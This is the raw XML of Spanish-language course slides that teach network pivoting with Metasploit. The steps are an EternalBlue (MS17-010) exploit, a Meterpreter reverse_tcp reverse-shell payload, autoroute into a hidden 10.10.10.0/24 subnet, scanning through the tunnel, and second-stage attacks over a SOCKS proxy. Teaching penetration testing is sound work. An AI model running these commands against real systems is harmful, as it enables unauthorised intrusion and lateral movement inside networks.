              <a:t>El objetivo es usarla para llegar a la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Máquina 2 (Servidor Interno)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>, que está en una red oculta (ej. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t>10.0.0.0/8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="18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F7845D9-B325-3087-8693-30285FE6CBF2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1269876" y="3096256"/>
            <a:ext cx="244827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/>
              <a:t>Paso 1: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t>Compromiso Inicial y Obtención de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:endParaRPr lang="es-MX" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t>El primer paso es la explotación directa de la vulnerabilidad para obtener una sesión controlada.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="1600" dirty="0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BA959DA8-048C-828E-E621-11093029EC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1332638"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4078188" y="2162328"/>
          <a:ext cx="7778322" cy="4462464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592774">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3908017040"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2592774">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="120858427"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2592774">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="943326248"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="3432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800"/>
                        <a:t>Acción</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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800"/>
                        <a:t>Comando Metasploit</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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800"/>
                        <a:t>Explicación</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="34327" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3210391845"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1167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800" b="1"/>
                        <a:t>Cargar el Exploit</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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use exploit/windows/smb/ms17_010_eternalblue</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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Se carga el módulo que explota la vulnerabilidad SMB.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="34327" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2544970639"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1167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800" b="1"/>
                        <a:t>Configurar Payload</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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set payload windows/x64/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>meterpreter</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>reverse_tcp</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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Se configura para que la máquina víctima se conecte a nuestro listener (un reverse shell).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="34327" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="356585402"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="892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800" b="1"/>
                        <a:t>Configurar Red</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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800"/>
                        <a:t>set RHOSTS &lt;IP_Víctima_Externa&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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Se apunta a la dirección IP pública o accesible del primer objetivo.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="34327" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1802624896"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="892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800" b="1"/>
                        <a:t>Ejecutar</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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800"/>
                        <a:t>run</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="343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 dirty="0"/>
                        <a:t>Si la explotación es exitosa, se obtiene la sesión de </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
                        <a:t>Meterpreter</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="68653" marR="68653" marT="34327" marB="34327" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="33186152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8028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D047A344-E943-F046-9B14-D4236F41610F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1053852" y="260648"/>
            <a:ext cx="100091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dirty="0"/>
              <a:t>Paso 2: Enumeración de Redes (Descubrimiento del Pivote)</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="2000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E09FFC39-BA3A-0C29-E86F-44BDEC051B38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1053852" y="836712"/>
            <a:ext cx="993710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800" dirty="0"/>
              <a:t>Una vez que tienes la sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> (ej. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> -i 1), el primer paso es determinar qué otras redes "ve" la máquina víctima. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Comando en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>ipconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> Resultado Clave: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> mostrará dos interfaces de red: La interfaz Externa (Ej. 192.168.1.100). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>La interfaz Interna Oculta (Ej. 10.10.10.5 con máscara 255.255.255.0). Conclusión: La nueva red interna a la que pivotar es 10.10.10.0/24.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="1800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70110D1A-D2B5-C1CC-CCD7-5A5486D9244C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1053853" y="2776378"/>
            <a:ext cx="10153128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/>
              <a:t>Paso 3: Agregar la Ruta de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> (El Salto)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Este es el paso crítico donde se configura el túnel. Le dices a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> que use tu sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> (el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Host Cebo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> o Máquina 1) como un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" i="1" dirty="0" err="1"/>
              <a:t>router</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" i="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Volver a la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> Presiona </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Ctrl+Z</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> y </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>usa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>background</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>si estás en la sesión.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t># Se agrega una ruta para toda la red 10.10.10.0/24, usando la sesión 1.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>autoroute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> -s 10.10.10.0/24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="es-MX" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>Verificación:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>route</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>(Para confirmar que la ruta a 10.10.10.0/24 está activa a través de la sesión </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1075661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84D5487-E98F-845B-5B2B-D1FB9399257A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1197868" y="404664"/>
            <a:ext cx="96490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/>
              <a:t>Paso 4: Escaneo de la Red Oculta (Movimiento Lateral)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>Ahora que tienes la ruta, puedes usar los módulos </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t>auxiliares</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t> de</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>para escanear hosts y servicios en el rango 10.10.10.x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>a través de ese túnel.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="18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EB9F7BA-E371-A8C3-3480-4DD27B0DB2BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3142084" y="1751316"/>
            <a:ext cx="6109138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b="1" dirty="0"/>
              <a:t>Resultado:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> El escáner TCP utiliza el túnel de la sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> para enviar paquetes a la red </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>10.10.10.x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" b="1" dirty="0"/>
              <a:t>descubriendo los servidores internos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> a los que nunca hubieras podido llegar directamente.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="18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413C545-7788-7340-D538-D0F3E55421FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3142084" y="1320741"/>
            <a:ext cx="61091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Configurar el Módulo de Escaneo:</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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0940AE3-4452-E7CF-AC08-9BCCD1470516}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="976073" y="3105834"/>
            <a:ext cx="10441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b="1" dirty="0"/>
              <a:t>Resultado:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> El escáner TCP utiliza el túnel de la sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t> para enviar paquetes a la red </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10.10.10.x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1800" dirty="0"/>
              <a:t>, descubriendo los servidores internos a los que nunca hubieras podido llegar directamente.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="18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9D78CCD-BFD4-E7E0-45F2-7C167870A051}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="984630" y="3836166"/>
            <a:ext cx="96462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dirty="0"/>
              <a:t>Paso 5: Segunda Explotación (Escalada de Impacto)</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="2000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9A8C7DD-DF63-1AA0-E696-39A1CE837284}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="976073" y="4367406"/>
            <a:ext cx="1062080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800" dirty="0"/>
              <a:t>Una vez que el escaneo revela que, por ejemplo, el servidor 10.10.10.15 tiene el puerto 80 (HTTP) abierto, el atacante puede: Atacar la Aplicación Web: Si esa IP aloja una aplicación, puedes pasar a la fase de Web Hacking y atacarla con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>SQLMap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>Burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> Suite a través del proxy SOCKS que configuramos en la clase anterior. Nuevo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t>: Si se encuentra un servicio vulnerable (ej. Telnet), puedes configurar un nuevo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" sz="1800" dirty="0"/>
              <a:t> y simplemente apuntar el RHOSTS a la dirección 10.10.10.15.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="159650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119DC8E5-E698-77DE-7FC1-B20BAB93F708}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3142084" y="1124744"/>
            <a:ext cx="61091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 err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> (Pivote) - El Proxy de Red</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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0A5A737-E1E5-D311-2C27-3D2707CEB255}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="1700808"/>
            <a:ext cx="106571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dirty="0"/>
              <a:t>el atacante utiliza la máquina comprometida (Host 1) como un puente (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>) para acceder a toda una subred (10.x.x.x) que antes estaba oculta. Esto generalmente se logra con un túnel SOCKS.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="20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4F3FA5D-0CF1-51D2-90F6-4965AC6BF7E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2926060" y="2636912"/>
            <a:ext cx="61091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Redirección de Puertos (Port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>Forwarding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>) - El Túnel Directo</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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BE4F484-85AC-BE06-458E-B7C5ED666147}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914946" y="3573016"/>
            <a:ext cx="1065207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dirty="0"/>
              <a:t>El atacante crea un túnel directo desde un puerto de su máquina (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>4444</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>) que atraviesa el Host 1 comprometido y se conecta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" b="1" dirty="0"/>
              <a:t>únicamente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> a un servicio específico (ej. RDP en el puerto 3389) en el Host 2, sin exponer toda la red interna.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="263661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1E8EEAC-7D46-7B8B-5673-03B1DE4EA9A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1125860" y="705177"/>
            <a:ext cx="1087320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sz="2000" dirty="0"/>
              <a:t>[Host Atacante] &lt;-----&gt; [Internet / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Router</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> Externo] &lt;-----&gt; [Host 1 Comprometido (El Pivote)]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>HOST ATACANTE (Kali)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MX" sz="2000" dirty="0"/>
              <a:t>IP: 192.168.1.10 (Ejemplo)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MX" sz="2000" dirty="0"/>
              <a:t>Ejecuta: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>auxiliary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>/server/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>socks_proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> (Puerto 1080)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MX" sz="2000" dirty="0"/>
              <a:t>Ejecuta: Herramientas (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>) con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>ProxyChains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX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s-MX" sz="2000" dirty="0"/>
              <a:t>HOST 1 COMPROMETIDO (El Pivote)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MX" sz="2000" dirty="0"/>
              <a:t>IP Externa: 192.168.1.50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MX" sz="2000" dirty="0"/>
              <a:t>IP Interna: 10.10.10.5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MX" sz="2000" dirty="0"/>
              <a:t>FUNCIÓN: Envía todo el tráfico del Atacante hacia la red 10.10.10.x</a:t>
